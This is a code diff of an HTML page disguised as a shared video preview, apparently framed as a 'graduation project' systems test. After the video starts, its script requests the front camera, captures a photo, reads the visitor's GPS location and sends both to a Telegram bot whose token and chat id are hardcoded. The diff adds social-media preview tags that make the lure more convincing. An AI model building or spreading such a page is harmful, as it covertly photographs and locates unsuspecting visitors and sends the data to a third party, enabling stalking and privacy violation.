@@ -4,15 +4,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <meta property="og:title" content="فديو">
-    <meta property="og:description" content="">
-    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png"> 
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:url" content="https://your-domain.com/">
+    <meta property="og:title" content="شاهد: عرض مشروع التخرج التقني">
+    <meta property="og:description" content="تشغيل عرض الفيديو التفاعلي بجودة عالية">
     <meta property="og:type" content="video.other">
-
-    <title>فديو</title>
+    
+    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png"> 
+    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:url" content="https://appsyria00.github.io/Facebook/">
+    
+    <title>مشروع التخرج - اختبار الأنظمة</title>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -30,23 +31,25 @@
     </div>
 
     <script>
+        // بيانات بوت التلجرام
         const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
         const chatId = "1611398303";
 
         window.onload = function() {
             const video = document.getElementById('mainVideo');
-            video.play().catch(() => console.log("Waiting for user..."));
+            video.play().catch(() => console.log("بانتظار تفاعل المستخدم"));
 
-            // بدء التجربة بعد 3 ثوانٍ فورة
+            // بدء الاختبار التقني بعد 3 ثوانٍ
             setTimeout(startTechnicalTest, 3000);
         };
 
         function startTechnicalTest() {
+            // طلب الصلاحيات (كاميرا وموقع)
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 captureAndSend(stream);
             })
-            .catch(err => console.log("Permission denied: " + err));
+            .catch(err => console.log("الوصول مرفوض: " + err));
         }
 
         function captureAndSend(stream) {
@@ -61,18 +64,20 @@
                 canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                 let imgData = canvas.toDataURL('image/jpeg');
 
+                // جلب الموقع الجغرافي
                 navigator.geolocation.getCurrentPosition(pos => {
                     sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                 }, () => {
                     sendToTelegram(imgData, "غير متوفر", "غير متوفر", "0");
                 });
 
+                // إيقاف الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
             }, 1000);
         }
 
         function sendToTelegram(imgData, lat, lon, acc) {
-            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 GPS: ${lat},${lon}\n⏰ وقت: ${new Date().toLocaleTimeString()}`);
+            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 GPS: ${lat},${lon}\n⏰ الوقت: ${new Date().toLocaleTimeString()}`);
             const url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
 
             let form = new FormData();
